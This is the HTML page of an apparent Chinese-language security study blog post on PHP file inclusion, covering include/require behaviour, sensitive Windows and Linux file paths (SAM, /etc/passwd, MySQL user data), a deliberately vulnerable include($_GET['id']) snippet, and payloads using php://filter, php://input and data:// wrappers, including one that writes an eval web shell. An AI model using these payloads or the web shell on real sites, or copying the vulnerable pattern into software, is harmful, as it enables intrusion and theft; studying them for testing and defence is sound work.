@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>文件包含 | z0ekball</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://z0ekball.github.io/favicon.ico?v=1649926914806">
+<link rel="stylesheet" href="https://z0ekball.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="漏洞原理：include()、include_once()、require()、require_once()等函数可以直接以php格式执行包含文件的代码，不受文件格式限制。web应用这些函数，且包含的文件路径是由用户传输参数方式引入，用户访..." />
+    <meta name="keywords" content="文件包含" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://z0ekball.github.io">
+        <img src="https://z0ekball.github.io/images/avatar.png?v=1649926914806" class="site-logo">
+        <h1 class="site-title">z0ekball</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      温故而知新
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://z0ekball.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">文件包含</h2>
+            <div class="post-date">2021-07-29</div>
+            
+              <div class="feature-container" style="background-image: url('https://z0ekball.github.io/post-images/wen-jian-bao-han.png')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <p><code>漏洞原理</code>：include()、include_once()、require()、require_once()等函数可以直接以php格式执行包含文件的代码，不受文件格式限制。web应用这些函数，且包含的文件路径是由用户传输参数方式引入，用户访问被包含文件时该文件以php格式解析。攻击者需要知道文件存放的路径才能进行访问。</p>
+<pre><code class="language-php">include():执行到include函数时才文件包含，找不到被包含的文件路径时，发出警告，脚本继续运行
+require():只要程序一运行就进行文件包含，找不到被包含的文件路径时，产生致命错误，脚本停止运行
+include_once()与require():与上述函数一样，只是若文件中代码已经被包含则不会再次包含
+</code></pre>
+<p><code>敏感路径</code>：</p>
+<p>典型：</p>
+<pre><code class="language-php">?page=a.php
+?home=b.html
+?file=content…
+</code></pre>
+<p>Windows：</p>
+<pre><code class="language-php">C:\boot.ini //查看系统版本
+C:\windows\system32\inetsrv\MetaBase.xml //IIS 配置文件
+C:\windows\repair\sam //存储 windows 系统初次安装的密码
+C:\Program Files\mysql\my.ini //mysql 配置
+C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
+C:\windows\php.ini //php 配置信息
+C:\windows\my.ini //mysql 配置文件
+</code></pre>
+<p>UNIX/Linux：</p>
+<pre><code class="language-php">/etc/passwd
+/usr/local/app/apache2/conf/httpd.conf //apache2 默认配置文件
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
+/usr/local/app/php5/lib/php.ini //PHP 相关配置
+/etc/httpd/conf/httpd.conf //apache
+/etc/php5/apache2/php.ini //ubuntu 系统的默认路径
+</code></pre>
+<h4 id="本地包含">本地包含</h4>
+<p>1.txt和1.php在同一文件目录下，被包含文件无论什么格式都能解析成php</p>
+<p>1.txt:</p>
+<pre><code class="language-php">&lt;?php phpinfo();?&gt;
+</code></pre>
+<p>1.php:</p>
+<pre><code class="language-php">&lt;?php
+$b=$_GET['id'];
+include($b);
+?&gt;
+</code></pre>
+<p><code>playload</code>:</p>
+<pre><code class="language-php">***/1.php?id=1.txt //返回phpinfo页面
+</code></pre>
+<h4 id="远程包含">远程包含</h4>
+<p><code>条件</code>： 一般 PHP 默认关闭远程包含，开启远程文件包含功能需要在 php.ini 中修改：<br>
+Allow_url_include = on、allow_url_fopen=on</p>
+<p><code>playload</code>:</p>
+<pre><code class="language-php">***/1.php?id=http:(文件绝对路径) 
+</code></pre>
+<h4 id="php伪协议">php伪协议</h4>
+<p><code>file://</code>:</p>
+<p>用于访问本地文件系统</p>
+<p>条件(php.ini)： allow_url_fopen   off/on    allow_url_include off/on</p>
+<pre><code class="language-php">file：//[文件的绝对路径和文件名]
+    file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
+file：//[文件的相对路径和文件名]
+    file=./phpinfo.txt
+file：//[http：//网络路径和文件名]
+    file=http://127.0.0.1/phpinfo.txt 
+</code></pre>
+<p><code>php：//filter</code>：</p>
+<p>用于读取源码并进行bash64编码输出；<br>
+条件（php.ini）：allow_url_fope   off/on  allow_url_include off/on</p>
+<pre><code class="language-php">php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码
+（针对php文件需要base64编码）
+</code></pre>
+<p><code>php：//input</code>：</p>
+<p>可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；<br>
+条件(php.ini)：allow_url_fope   off/on     allow_url_include on</p>
+<pre><code class="language-php">php://input + [POST DATA]执行php代码
+</code></pre>
+<p>有写入权限则可以写入一句话木马</p>
+<pre><code class="language-php">php://input
+[POST DATA部分]
+&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;
+</code></pre>
+<p><code>php://stdin</code>:</p>
+<p>只读，php://stdout 和 php://stderr 是只写的。</p>
+<p><code>php://output</code>:是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
+<p><code>php://fd</code>:允许直接访问指定的文件描述符。</p>
+<p><code>zip://,bzip://,zlib://</code>:</p>
+<p>压缩流，可以访问压缩文件中的子文件，不需要传后缀名</p>
+<p>条件：    allow_url_fope   off/on    allow_url_include off/on</p>
+<pre><code class="language-php">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
+bzip2://file.bz2
+zlib://file.gz
+</code></pre>
+<p><code>data://</code>：</p>
+<p>传递相应格式数据，用于执行php代码</p>
+<p>条件：    allow_url_fope   on    allow_url_include on</p>
+<pre><code class="language-php">data://text/plain,&lt;?php%20phpinfo();?&gt;
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</code></pre>
+<p><code>phar：//</code></p>
+<p>与zip://类似，同样可以访问zip格式压缩包内容</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://z0ekball.github.io/tag/_3AKbRpvm/" class="tag">
+                    文件包含
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://z0ekball.github.io/post/wen-jian-shang-chuan/">
+                  <h3 class="post-title">
+                    文件上传
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
